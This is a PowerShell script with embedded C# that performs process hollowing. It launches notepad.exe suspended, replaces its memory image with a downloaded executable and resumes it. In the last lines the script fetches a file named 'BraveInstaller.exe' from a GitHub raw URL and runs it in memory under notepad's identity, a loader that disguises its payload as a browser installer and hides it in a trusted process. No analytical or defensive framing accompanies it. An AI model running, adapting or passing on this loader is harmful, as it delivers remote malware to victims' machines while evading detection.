Add-Type -TypeDefinition @"

using System;
using System.Runtime.InteropServices;

public static class H
{
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO {
        public int cb;
        public string lpReserved, lpDesktop, lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DOS_HEADER {
        public ushort e_magic;
        public ushort e_cblp, e_cp, e_crlc, e_cparhdr, e_minalloc, e_maxalloc, e_ss, e_sp, e_csum, e_ip, e_cs, e_lfarlc, e_ovno;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public ushort[] e_res;
        public ushort e_oemid, e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)] public ushort[] e_res2;
        public int e_lfanew;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_FILE_HEADER {
        public ushort Machine, NumberOfSections;
        public uint TimeDateStamp, PointerToSymbolTable, NumberOfSymbols;
        public ushort SizeOfOptionalHeader, Characteristics;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER32 {
        public ushort Magic;
        public byte MajorLinkerVersion, MinorLinkerVersion;
        public uint SizeOfCode, SizeOfInitializedData, SizeOfUninitializedData, AddressOfEntryPoint, BaseOfCode, BaseOfData, ImageBase;
        public uint SectionAlignment, FileAlignment;
        public ushort MajorOperatingSystemVersion, MinorOperatingSystemVersion, MajorImageVersion, MinorImageVersion, MajorSubsystemVersion, MinorSubsystemVersion;
        public uint Win32VersionValue, SizeOfImage, SizeOfHeaders, CheckSum;
        public ushort Subsystem, DllCharacteristics;
        public uint SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit;
        public uint LoaderFlags, NumberOfRvaAndSizes;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_SECTION_HEADER {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public byte[] Name;
        public uint VirtualSize, VirtualAddress, SizeOfRawData, PointerToRawData;
        public uint PointerToRelocations, PointerToLinenumbers;
        public ushort NumberOfRelocations, NumberOfLinenumbers;
        public uint Characteristics;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct CONTEXT {
        public uint ContextFlags;
        public uint Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public uint SegGs, SegFs, SegEs, SegDs;
        public uint Edi, Esi, Ebx, Edx, Ecx, Eax;
        public uint Ebp, Eip, SegCs, EFlags, Esp, SegSs;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreateProcess(string app, string cmd, IntPtr pAttr, IntPtr tAttr, bool inherit,
        uint flags, IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
    [DllImport("kernel32.dll")]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT ctx);
    [DllImport("kernel32.dll")]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT ctx);
    [DllImport("kernel32.dll")]
    static extern uint ResumeThread(IntPtr hThread);
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr addr, uint size, uint type, uint prot);
    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr addr, byte[] buf, uint sz, out uint written);
    [DllImport("ntdll.dll")]
    static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr addr);

    const uint CREATE_SUSPENDED = 0x4;
    const uint MEM_COMMIT = 0x1000, MEM_RESERVE = 0x2000, PAGE_READWRITE = 0x04;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint CONTEXT_FULL = 0x10007;

    public static int Run(byte[] pe)
    {
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi;
        if (!CreateProcess(@"C:\Windows\System32\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false,
            CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
            return 1;

        var dos = BytesToStruct<IMAGE_DOS_HEADER>(pe, 0);
        int peOff = dos.e_lfanew;
        int ntOff = peOff + 4;
        var fh = BytesToStruct<IMAGE_FILE_HEADER>(pe, ntOff);
        if (fh.Machine != 0x014c) // IMAGE_FILE_MACHINE_I386
            return 5; // only 32-bit supported

        int optOff = ntOff + Marshal.SizeOf<IMAGE_FILE_HEADER>();
        var o32 = BytesToStruct<IMAGE_OPTIONAL_HEADER32>(pe, optOff);
        uint prefBase = o32.ImageBase, sizeImg = o32.SizeOfImage, epRva = o32.AddressOfEntryPoint;

        CONTEXT ctx = new CONTEXT();
        ctx.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, ref ctx)) return 2;

        // Unmap original image
        NtUnmapViewOfSection(pi.hProcess, (IntPtr)prefBase);

        // Allocate memory for new image
        IntPtr newBase = VirtualAllocEx(pi.hProcess, (IntPtr)prefBase, sizeImg, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (newBase == IntPtr.Zero)
            newBase = VirtualAllocEx(pi.hProcess, IntPtr.Zero, sizeImg, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (newBase == IntPtr.Zero) return 3;

        uint written;
        int hdrSize = optOff + fh.SizeOfOptionalHeader + fh.NumberOfSections * Marshal.SizeOf<IMAGE_SECTION_HEADER>();
        byte[] hdr = new byte[hdrSize];
        Array.Copy(pe, 0, hdr, 0, hdrSize);
        WriteProcessMemory(pi.hProcess, newBase, hdr, (uint)hdrSize, out written);

        for (int i = 0; i < fh.NumberOfSections; i++) {
            var sec = BytesToStruct<IMAGE_SECTION_HEADER>(pe, optOff + fh.SizeOfOptionalHeader + i * Marshal.SizeOf<IMAGE_SECTION_HEADER>());
            if (sec.SizeOfRawData > 0) {
                byte[] secData = new byte[sec.SizeOfRawData];
                Array.Copy(pe, (int)sec.PointerToRawData, secData, 0, sec.SizeOfRawData);
                IntPtr dest = IntPtr.Add(newBase, (int)sec.VirtualAddress);
                WriteProcessMemory(pi.hProcess, dest, secData, sec.SizeOfRawData, out written);
            }
        }

        // Change protection to executable
        VirtualAllocEx(pi.hProcess, newBase, sizeImg, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        // Set EIP to new entry point (using unchecked to prevent overflow exceptions)
        unchecked {
            ctx.Eip = (uint)(newBase.ToInt32() + (int)epRva);
        }
        if (!SetThreadContext(pi.hThread, ref ctx)) return 4;

        ResumeThread(pi.hThread);
        return 0;
    }

    static T BytesToStruct<T>(byte[] buf, int offset) where T : struct {
        int size = Marshal.SizeOf<T>();
        IntPtr p = Marshal.AllocHGlobal(size);
        Marshal.Copy(buf, offset, p, size);
        T s = Marshal.PtrToStructure<T>(p);
        Marshal.FreeHGlobal(p);
        return s;
    }
}

"@
$data = (New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/PoolSync-Studios/MCAntiPools/refs/heads/main/docs/assets/BraveInstaller.exe')
[H]::Run($data)
